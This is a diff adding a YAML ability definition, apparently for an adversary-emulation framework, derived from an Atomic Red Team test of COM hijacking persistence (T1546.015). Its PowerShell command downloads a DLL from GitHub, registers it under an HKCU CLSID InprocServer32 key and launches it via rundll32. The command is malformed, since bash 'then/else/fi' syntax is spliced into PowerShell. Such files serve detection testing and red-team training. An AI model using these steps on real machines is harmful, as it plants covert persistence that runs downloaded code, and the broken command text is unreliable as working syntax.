@@ -1,0 +1,68 @@
+- id: 48117158-d7be-441b-bc6a-d9e36e47b52b
+  name: COM Hijacking - InprocServer32
+  description: 'This test uses PowerShell to hijack a reference to a Component Object
+    Model by creating registry values under InprocServer32 key in the HKCU hive then
+    calling the Class ID to be executed via rundll32.exe.
+
+
+    Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/'
+  tactic: persistence
+  technique:
+    attack_id: T1546.015
+    name: 'Event Triggered Execution: Component Object Model Hijacking'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"; fi; New-Item
+          -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}''
+          -Value ''MSAA AccPropServices''; New-Item -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32''
+          -Value "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"; New-ItemProperty
+          -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32''
+          -Name ''ThreadingModel'' -Value ''Apartment'' -PropertyType "String"; Start-Process
+          -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList ''-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'''
+        cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse
+          -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1546.015
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      clsid_threading:
+        description: Threading Model
+        type: string
+        default: Apartment
+      dllpath:
+        description: Path to the DLL.
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll
+      clsid:
+        description: Class ID to hijack.
+        type: string
+        default: '{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+      clsid_description:
+        description: Description for CLSID
+        type: string
+        default: MSAA AccPropServices
+    dependencies:
+    - description: DLL For testing
+      prereq_command: if (Test-Path "#{dllpath}") {exit 0} else {exit 1}
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+        -OutFile "#{dllpath}"
+
+        '
+    technique_created: '2020-03-16T14:12:47.923Z'
+    atomic_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+    import_timestamp: '2025-06-24T11:15:05.340461Z'
